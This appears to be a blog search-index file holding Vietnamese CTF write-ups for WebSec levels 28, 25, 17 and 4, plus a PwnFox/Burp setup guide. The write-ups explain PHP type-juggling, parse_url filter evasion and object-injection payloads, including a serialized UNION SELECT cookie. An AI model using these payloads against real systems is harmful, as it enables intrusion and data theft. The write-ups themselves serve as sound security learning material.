<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>[WebSec] Level 28</title>
    <link href="/2022/08/04/level28/"/>
    <url>/2022/08/04/level28/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://websec.fr/level28/index.php">https://websec.fr/level28/index.php</a></p></blockquote><h3 id="Gathering-information"><a href="#Gathering-information" class="headerlink" title="Gathering information"></a><strong>Gathering information</strong></h3><p>Thôi, bài này mình không test kiểu BlackBox nữa… Vì test có ra lỗi đâu &#x3D;))</p><p>Vào đọc source code thôi. Các challenge CTF thường thì họ đều cho mình source để đọc. </p><p>Các bạn có thể theo dõi đoạn code bên dưới.</p><h4 id="Source-code"><a href="#Source-code" class="headerlink" title="Source code"></a><strong>Source code</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;flag_file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">4096</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Your file is too heavy.&#x27;</span>);<br>  &#125;<br>  <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;./tmp/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&#x27;.php&#x27;</span>;<br><br>  <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;flag_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;r&#x27;</span>);<br>  <span class="hljs-variable">$flagfilecontent</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;flag_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]));<br>  @<span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br><br>  <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$flagfilecontent</span>);<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5_file</span>(<span class="hljs-variable">$filename</span>) === <span class="hljs-title function_ invoke__">md5_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;checksum&#x27;</span>] == <span class="hljs-title function_ invoke__">crc32</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;checksum&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>);  <span class="hljs-comment">// it contains the `$flag` variable</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;Nope, <span class="hljs-subst">$filename</span> is not the right file, sorry.&quot;</span>;<br>        <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// Deter bruteforce</span><br>    &#125;<br><br>  <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>------------------------------------------------------------------------------------------<br><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$flag</span>))&#123; <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>; &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Can you guess it?&#x27;</span>; &#125;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Phân tích về source code:</p><ul><li><p>Từ dòng 1 - 5: Hàm <code>if()</code> kiểm tra mình đã submit hay không? Nếu có thì file upload của mình lên có nặng quá <code>4096 kb</code> hay không? Nếu nặng quá <code>4096 kb</code> thì sẽ báo lỗi là <code>Your file is too heavy.</code> và <code>die</code> chương trình.</p></li><li><p>Dòng 6: <code>$file_name</code> sẽ được gán bằng giá trị như trên source code, với <code>md5($_SERVER[&#39;REMOTE_ADDR&#39;])</code> sẽ là giá trị IP mình đang truy cập được <code>encrypt md5</code>.</p><ul><li><code>./tmp/ae018b12db79741c0b9026378e0be6d5.php</code><br>  <img src="/img/CTF/WebSec/lv28/md5_ip.png" alt="nslookup ip"></li></ul></li><li><p>Dòng 12: nội dung trong file được upload sẽ được gán cho <code>$file_name</code>.</p></li><li><p>Dòng 13: Trong hàm <code>if()</code> kiểm tra <code>md5($file_upload</code>) phải trùng với nội dung trong file flag <code>md5(flag.php)</code>. Kết hợp việc việc <code>loose compare</code> giữa <code>checksum</code> mình nhập vào và <code>crc32(&#39;checksum&#39;)</code>.</p></li><li><p>Để bypass qua được <code>loose compare</code> của <strong>checksum</strong> thì mình sẽ dùng <code>Array()</code> để so sánh.</p></li></ul><p><img src="/img/CTF/WebSec/lv28/crc_bypass.png" alt="nslookup ip"></p><p><strong><em>Typing …</em></strong></p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a><strong>Exploit</strong></h3><p><strong><em>Stuffing …</em></strong></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Websec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>babysteps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[WebSec] Level 25</title>
    <link href="/2022/07/30/level25/"/>
    <url>/2022/07/30/level25/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="http://websec.fr/level25/index.php">http://websec.fr/level25/index.php</a></p></blockquote><h3 id="Gathering-information"><a href="#Gathering-information" class="headerlink" title="Gathering information"></a><strong>Gathering information</strong></h3><p>Đầu tiên vẫn thử các payloads về SQLi, về XSS, … Tuy nhiên vẫn không có lỗi gì xuất hiện. </p><p>View-source challenge thì mình cần chú ý đến 2 đoạn code <code>PHP</code> trong đó.</p><h4 id="Source-code-1"><a href="#Source-code-1" class="headerlink" title="Source code 1"></a><strong>Source code 1</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: http://websec.fr/level25/index.php?page=main&#x27;</span>);<br>  <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Với đoạn <code>code 1</code> trên thì check xem trong URL của chúng có tồn tại <code>parameter page</code> không. Nếu không có, thì sẽ Redirect sang trang có <code>page=main</code> (trang chủ của challenge).</p><h4 id="Source-code-2"><a href="#Source-code-2" class="headerlink" title="Source code 2"></a><strong>Source code 2</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>])[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$v</span>, <span class="hljs-string">&#x27;flag&#x27;</span>) !== <span class="hljs-literal">false</span>)<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You are not allowed to get the flag, sorry :/&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>] . <span class="hljs-string">&#x27;.txt&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Với đoạn <code>code 2</code> ở trên, chúng ta có nhiều vấn đề để phân tích hơn.<br>Dòng code thứ 2, hàm <code>parse_url()</code> có chức năng phân tích các thành phân của URL ra. Sau đó sẽ gán vào biến <code>$query</code>.</p><p>Hàm <a href="https://www.php.net/manual/en/function.parse-url.php">parse_url()</a> hoạt động như sau:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs txt">- $url: &quot;http://example.com/thu-muc/file.php?cmd=ls#rce&quot;<br>- Sau khi đưa biến vào hàm parse_url() thì hết quả ra sẽ là:<br><br>array(5) &#123;<br>  [&quot;scheme&quot;]=&gt;<br>  string(4) &quot;http&quot;<br>  [&quot;host&quot;]=&gt;<br>  string(11) &quot;example.com&quot;<br>  [&quot;path&quot;]=&gt;<br>  string(17) &quot;/thu-muc/file.php&quot;<br>  [&quot;query&quot;]=&gt;<br>  string(6) &quot;cmd=ls&quot;<br>  [&quot;fragment&quot;]=&gt;<br>  string(3) &quot;rce&quot;<br>&#125;<br><br>- Return của hàm parse_url() là: int|string|array|null|false<br></code></pre></td></tr></table></figure><p>Sau khi vào vòng <code>for</code>, nếu như giá trị trong <code>$query</code> lúc này chính kết quả đầu ra của hàm <code>parse_url()</code> mà khác <code>false</code> thì chương trình sẽ <code>die</code>.</p><p><em>Vậy, làm sao để chương trình không <code>die</code>?</em></p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a><strong>Exploit</strong></h3><p>Để chương trình in ra được flag, thì phải bypass qua vòng <code>for</code>.</p><h4 id="Search-Google-“parse-url-return-false-in-php”"><a href="#Search-Google-“parse-url-return-false-in-php”" class="headerlink" title="Search Google: “parse_url return false in php”"></a><strong>Search Google</strong>: “parse_url return false in php”</h4><blockquote><p><a href="https://stackoverflow.com/questions/47807529/how-to-avoid-php-parse-url-return-false-when-parse-sa-12b-12-3-3-41233-whi">https://stackoverflow.com/questions/47807529/how-to-avoid-php-parse-url-return-false-when-parse-sa-12b-12-3-3-41233-whi</a></p></blockquote><p>Sau khi tham khảo link trên kết hợp việc debug, thì mình phải cho cái cấu trúc của các param sau khi qua hàm parse_url kết quả bị sai.</p><p>Ví dụ:</p><ul><li><code>http://example.com///thu-muc/file.php?...</code><br>-&gt; <code>///</code> sẽ làm cho parse_url() hiểu là host. Nên sẽ bị sai.</li><li><code>http://example.com/thu-muc/file.php?cmd=ls&amp;a=1.1.1.1:39</code><br>-&gt; <code>&amp;a</code> có giá trị là host:port, cũng sẽ làm cho parse_url() hiểu sai.</li></ul><p>Mục đích của mình lấy flag ở file flag.txt. Vì sau thi include page vào thì chương trình sẽ tự gắn đuôi txt cho mình.</p><p>Việc còn lại chỉ lấy flag thôi.</p><p><img src="/img/CTF/WebSec/lv25/flag.png" alt="Got the flag"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Websec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>babysteps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[WebSec] Level 17</title>
    <link href="/2022/07/24/Level17/"/>
    <url>/2022/07/24/Level17/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://websec.fr/level17/index.php">https://websec.fr/level17/index.php</a></p></blockquote><hr><h3 id="Gathering-information"><a href="#Gathering-information" class="headerlink" title="Gathering information"></a><strong>Gathering information</strong></h3><p>Như thường lệ, bước đầu tiên chúng ta ngó xem qua phần giao diện, có chỗ input và button Submit.</p><p>Nó yêu cầu mình đoán flag, nên thử nhập đại gì đó, và xem response trả về thế nào. Không có gì đáng chú ý hơn link tới source code.</p><p>Challenge cho sẵn luôn source code, chúng qua và để ý đến 2 phần code PHP.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sleep_rand</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-comment">/* I wish php5 had random_int() */</span><br>        <span class="hljs-variable">$range</span> = <span class="hljs-number">100000</span>;<br>        <span class="hljs-variable">$bytes</span> = (<span class="hljs-keyword">int</span>) (<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-variable">$range</span>, <span class="hljs-number">2</span>) / <span class="hljs-number">8</span>) + <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">do</span> &#123;  <span class="hljs-comment">/* Side effect: more random cpu cycles wasted ;) */</span><br>            <span class="hljs-variable">$rnd</span> = <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="hljs-variable">$bytes</span>)));<br>        &#125; <span class="hljs-keyword">while</span> (<span class="hljs-variable">$rnd</span> &gt;= <span class="hljs-variable">$range</span>);<br>        <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-variable">$rnd</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Đoạn code trên chỉ là hàm để delay trong quá trình thực thi chương trình. Khi nào gọi lại hàm <code>sleep_rand()</code> thì đoạn xử lí đó sẽ delay.</p><p>Thời gian delay lâu hay mau phụ thuộc vào hàm random ở dòng 8. Hàm <code>openssl_random_pseudo_bytes()</code> sẽ tạo ra random string pseudo_bytes từ param $bytes ở dạng binary.</p><p>Sau đó hàm <code>bin2hex()</code> sẽ convert binary sang dạng hex. Tiếp theo hàm <code>hexdec()</code> sẽ convert hex sang dạng decemal.</p><p>Đại khái là hàm trên cũng không ảnh hương tới challenge nhiều, vì hàm <code>usleep()</code> sẽ delay chương trình với param là <strong>micro second</strong>. Ví dụ <code>usleep(2000000)</code> thì sẽ delay 2s.</p><hr><p>Tiếp đến source code còn lại:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-title function_ invoke__">strcasecmp</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>], <span class="hljs-variable">$flag</span>))<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;alert alert-success&quot;&gt;Here is your flag: &lt;mark&gt;&#x27;</span> . <span class="hljs-variable">$flag</span> . <span class="hljs-string">&#x27;&lt;/mark&gt;.&lt;/div&gt;&#x27;</span>;   <br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;alert alert-danger&quot;&gt;Invalid flag, sorry.&lt;/div&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Quan sát thấy thì đoạn code phía trên sẽ so sánh giá trị của <code>flag</code> khi input từ user vào và giá trị <code>$flag</code> đã assign trong chương trình. </p><p>Nhưng để so sánh thì dùng hàm <code>strcasecmp()</code>, điều đáng nói hơn ở đây là dấu chấm thang ở phía trước hàm.</p><blockquote><p>Hàm <code>strcasecmp($str1, $str2)</code> sẽ nhận vào 2 string để so sánh. Kết quả trả về là:</p><ul><li>&gt; 0: Nếu như $str1 &gt; $str2.</li><li>&lt; 0: Nếu như $str1 &lt; $str2.</li><li>&#x3D; 0: Nếu như $str1 &#x3D; $str2.</li></ul></blockquote><p>Dấu chấm thang ở phía trước có nghĩa là <code>$str1</code> và <code>$str2</code> bằng nhau.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (! <span class="hljs-title function_ invoke__">strcasecmp</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>], <span class="hljs-variable">$flag</span>))<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strcasecpm</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>], <span class="hljs-variable">$flag</span>) == <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>Hai dòng code trên là tương tự nhau về mặt chức năng và bản chất.</p><p>Khi so sánh <code>==</code> thì lại để ý tới lỗi <a href="https://www.invicti.com/blog/web-security/php-type-juggling-vulnerabilities/">Type Jugling</a> và tham khảo hai hình bên dưới.</p><p><img src="/img/CTF/WebSec/lv17/loose-comparison.png" alt="Loose"></p><p><img src="/img/CTF/WebSec/lv17/strict-comparison.png" alt="Strict"><br>&#96;</p><hr><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a><strong>Exploit</strong></h3><p>Khi mà so sánh trong hàm <code>strcasecpm()</code> sẽ cho ra kết quả là <code>False</code>. Tiếp theo <code>False</code> so với <code>0</code> thì sẽ là <code>True</code>.</p><p><img src="/img/CTF/WebSec/lv17/debug1.png" alt="Debug compare"></p><p>Từ đó, sẽ tìm ra được flag.</p><blockquote><p>Payload: <strong>flag[]&#x3D;1</strong></p></blockquote><p>Kết quả:</p><p><img src="/img/CTF/WebSec/lv17/kq.png" alt="KetQua"></p><h3 id="References"><a href="#References" class="headerlink" title="References"></a><strong>References</strong></h3><p><a href="https://techgeekgalaxy.com/php-equality-comparisons/#:~:text=or%20security%20exploits.-,Strict%20Comparison%20(%3D%3D%3D),types%20then%20false%20is%20returned.">https://techgeekgalaxy.com/php-equality-comparisons/#:~:text=or%20security%20exploits.-,Strict%20Comparison%20(%3D%3D%3D),types%20then%20false%20is%20returned.</a></p><p><a href="https://danuxx.blogspot.com/2013/03/unauthorized-access-bypassing-php-strcmp.html">https://danuxx.blogspot.com/2013/03/unauthorized-access-bypassing-php-strcmp.html</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Websec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>babysteps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PwnFox Extension on Firefox for Pentester</title>
    <link href="/2022/07/20/PwnFox/"/>
    <url>/2022/07/20/PwnFox/</url>
    
    <content type="html"><![CDATA[<p>Trong bài viết này, mình sẽ giới thiệu mọi người một extension chuyên dùng cho việc cài đặt proxy cho Burp Suite, ngoài ra nó còn có nhiều tính năng hay ho nữa 😍.</p><blockquote><p>Link extension: <a href="https://github.com/yeswehack/PwnFox">https://github.com/yeswehack/PwnFox</a></p></blockquote><h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a><strong>Install</strong></h3><p>Các bạn vào link github ở trên, download file pwnfox.jar về máy và lưu nó ở thư mục nào mà bạn muốn.</p><p><img src="/img/Technical/PwnFox/image1.png" alt="Download PwnFox.jar"></p><p>Sau khi tải extension xong, mở ứng dụng Burp Suite lên, vào tab <strong>Extension</strong>.</p><p><img src="/img/Technical/PwnFox/image2.png" alt="Add Extender"></p><p>Chọn Add, cửa sổ Load Burp Extension hiện lên, chọn đến file pwnfox.jar vừa tải lúc nãy, sau đó bấm Next là xong.</p><h3 id="Set-up"><a href="#Set-up" class="headerlink" title="Set up"></a><strong>Set up</strong></h3><p>Mở trình duyệt FireFox, tìm kiếm <a href="https://addons.mozilla.org/vi/firefox/addon/pwnfox/">pwnfox entension</a>.</p><p><img src="/img/Technical/PwnFox/image3.png" alt="PwnFox for FireFox"></p><p>Sau khi cài extension cho Firefox, setting của Pwnfox kiểm tra IP và PORT đã đúng chưa.</p><p><img src="/img/Technical/PwnFox/image4.png"></p><p>Bước cuối cùng là vào phần Setting Network của Firefox để lựa chọn <strong>No proxy</strong>.</p><p><img src="/img/Technical/PwnFox/image5.png" alt="No Proxy Setting"></p><h3 id="Tinh-nang-container-tab"><a href="#Tinh-nang-container-tab" class="headerlink" title="Tính năng container tab"></a><strong>Tính năng container tab</strong></h3><p>Nó sẽ là những tab có màu sắc trên firefox.</p><p><img src="/img/Technical/PwnFox/image6.png"></p><p>Mỗi tab sẽ hoạt động độc lập với các session khác nhau.</p><p>Khi đi qua proxy Burp Suite, vào history sẽ thấy được màu của các tab tương ứng.</p><p><img src="/img/Technical/PwnFox/image7.png" alt="Color items"></p>]]></content>
    
    
    <categories>
      
      <category>Technical</category>
      
    </categories>
    
    
    <tags>
      
      <tag>extension</tag>
      
      <tag>pwnfox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[WebSec] Level 4</title>
    <link href="/2022/07/19/Level4/"/>
    <url>/2022/07/19/Level4/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://websec.fr/level04/index.php">https://websec.fr/level04/index.php</a></p></blockquote><h3 id="Gathering-information"><a href="#Gathering-information" class="headerlink" title="Gathering information"></a><strong>Gathering information</strong></h3><p>Challenge này có chỗ input là id, nhưng không giống như Level 1 là sẽ ra lỗi khi nhập ký tự đặc biệt.</p><p>Với giá trị cookie leet_hax0r: Decode base64 ra thì là một dạng json sau khi <a href="https://snoopysecurity.github.io/web-application-security/2021/01/08/02_php_object_injection_exploitation-notes.html">serialize</a>.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">a<span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ip&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">13</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;116.96.78.101&quot;</span>;<span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>Ý nghĩa của các thành phần đoạn JSON trên là:</p><blockquote><p>a: array sẽ chứa 1 giá trị duy nhất là <code>ip</code>.<br><code>ip</code> có độ dài là 2, và có <code>value</code> dài 13 kí tự.</p></blockquote><p>Cấu trúc của Serialize trong PHP có dạng <code>data-type:data</code>.</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs txt">BOOLEAN<br>b:value (value chỉ có giá trị 1 hoặc 0. 1 là đúng, 0 là sai).<br><br>STRING<br>s:size:value (s:5:&quot;12345&quot;)<br><br>INTEGER<br>i:value<br><br>NULL<br>N;<br><br>ARRAY<br>a:size:&#123;key:value; (lặp lại key:value đến khi bằng size))&#125;<br><br>OBJECT<br>O:length_object_name:object_name:object_size:&#123;&lt;property&gt;:&lt;value&gt;&#125;<br></code></pre></td></tr></table></figure><hr><p>Challenge cho 2 source code, nhưng chú ý trong source 1 là viết ở dạng OOP, có các <a href="https://www.php.net/manual/en/language.oop5.magic.php">Magic Methods</a> được dùng như <code>__construct()</code>, <code>__destruct()</code>.</p><ul><li><p><code>__construct()</code>: hàm này được gọi khi khởi tạo một đối tượng.</p></li><li><p><code>__destruct()</code>: hàm này được gọi khi đối tượng bị xoá đi. Khi nó không tham chiếu đến đối tượng deserialize tồn tại.</p></li></ul><p><img src="/img/CTF/WebSec/lv4/image1.png" alt="Source code 1"></p><p><img src="/img/CTF/WebSec/lv4/image2.png" alt="Source code 2"></p><p>Quá trình serialize và deserialize diễn ra như hình bên dưới:</p><p><img src="/img/CTF/WebSec/lv4/ser_deser.png" alt="Serialize &amp; Deserialize"></p><hr><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a><strong>Exploit</strong></h3><p>Để ý dòng code ở source 2. Thì giá trị cookie leet_hax0r được <code>encode base64</code>.</p><p>Mình sẽ tạo dòng Code giống class SQL để serialize nó.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SQL</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$query</span>=<span class="hljs-string">&#x27;select username from users where id = -1 union select sql from sqlite_master&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SQL</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>), PHP_EOL;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p>Sau khi bulid source xong, run code sẽ ra Object và đoạn base64 như sau:</p><p><img src="/img/CTF/WebSec/lv4/image3.png" alt="Serialize SQL Object"></p><p><em>Vì sao phải dùng UNION để select sql mà không select ở vế trước luôn?</em></p><blockquote><p>Vì ta để ý source code 2, trong hàm <code>__destruct()</code> chỉ in ra màn hình <code>$row[&#39;username&#39;]</code>. Nên bắt buộc trong câu query của mình phải select username.</p></blockquote><p>Hoặc có thể dùng câu query gán tên cột cần select bằng username như sau cho gọn:</p><pre><code class="sql">select group_concat(sql) as username from ...</code></pre><p>Copy đoạn base64 thay thế giá trị cookie leet_hax0r, sau đó gửi reuqest:</p><p><img src="/img/CTF/WebSec/lv4/image4.png" alt="Cấu trúc câu query được dùng"></p><p>Kiểm tra xem còn table nào ngoài users không? Kết quả là không còn table nào khác.</p><p><img src="/img/CTF/WebSec/lv4/image5.png" alt="Check another table"></p><p>Mình đoán là Flag nằm ở password, nên sẽ select password ra.</p><p><img src="/img/CTF/WebSec/lv4/image6.png" alt="Payload get flag"></p><p><img src="/img/CTF/WebSec/lv4/image7.png" alt="Got the flag"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Websec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>babysteps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[WebSec] Level 1</title>
    <link href="/2022/07/19/Level1/"/>
    <url>/2022/07/19/Level1/</url>
    
